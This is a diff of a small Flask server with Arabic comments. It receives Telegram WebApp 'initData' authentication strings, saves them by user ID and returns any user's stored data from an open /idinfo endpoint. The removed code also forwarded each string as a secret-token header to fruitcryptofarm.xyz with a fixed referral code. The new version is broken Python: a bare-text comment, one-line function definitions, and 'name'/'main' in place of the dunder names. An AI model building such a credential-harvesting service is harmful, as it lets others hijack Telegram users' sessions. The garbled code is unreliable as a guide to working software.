@@ -1,62 +1,29 @@
-from flask import Flask, request, render_template, jsonify
-import requests
-import urllib.parse as ul
-import json
+from flask import Flask, request, jsonify, render_template
 
-app = Flask('__name__')
+app = Flask(name)
 
-# تخزين مؤقت للبيانات
-data_store = {}
+تخزين مؤقت للمعلومات
 
-@app.route('/')
-def home():
-    return render_template('index.html')
+saved_data = {}
 
-@app.route('/id', methods=['POST'])
-def receive_data():
-    content = request.json
-    init_data = content.get("initData")
+@app.route('/') def index(): return render_template('index.html')
 
-    # تنفيذ الطلب الخارجي كما في JavaScript
-    headers = {
-        'Content-Type': 'application/json',
-        'x-telegram-bot-api-secret-token': init_data
-    }
-    data = {
-        "referral_code": "5343064159"
-    }
+@app.route('/id', methods=['POST']) def receive_data(): data = request.get_json() init_data = data.get('initData')
 
-    try:
-        response = requests.post('https://fruitcryptofarm.xyz/api/auth/telegram', headers=headers, json=data)
-        api_response = response.text
-    except Exception as e:
-        return f"خطأ أثناء الاتصال بـ API: {str(e)}", 500
+# استخراج user id إن وجد من initData (بشكل مبسط)
+user_id = None
+if init_data:
+    import re
+    match = re.search(r'id%22%3A(\d+)', init_data)
+    if match:
+        user_id = match.group(1)
+        saved_data[user_id] = {
+            'initData': init_data
+        }
 
-    # استخراج user_id من initData إن أمكن
-    user_id = "unknown"
-    try:
-        parsed = ul.parse_qs(init_data)
-        user_data = parsed.get("user")
-        if user_data:
-            user_info = json.loads(user_data[0])
-            user_id = str(user_info.get("id", "unknown"))
-    except Exception as e:
-        print("خطأ في التحليل:", e)
+return 'تم حفظ البيانات' if user_id else 'لم يتم العثور على user_id'
 
-    # حفظ البيانات
-    data_store[user_id] = {
-        "init_data": init_data,
-        "api_response": api_response
-    }
+@app.route('/idinfo') def get_info(): user_id = request.args.get('id') if user_id in saved_data: return jsonify(saved_data[user_id]) return 'لا توجد بيانات لهذا المعرف', 404
 
-    return f"تم الحفظ للمستخدم {user_id}"
+if name == 'main': app.run(host='0.0.0.0', port=5000, debug=True)
 
-@app.route('/idinfo')
-def id_info():
-    user_id = request.args.get("id")
-    if user_id in data_store:
-        return jsonify(data_store[user_id])
-    return "لم يتم العثور على بيانات لهذا المستخدم.", 404
-
-if '__name__'== '__main__':
-    app.run(host="0.0.0.0", port=5000)
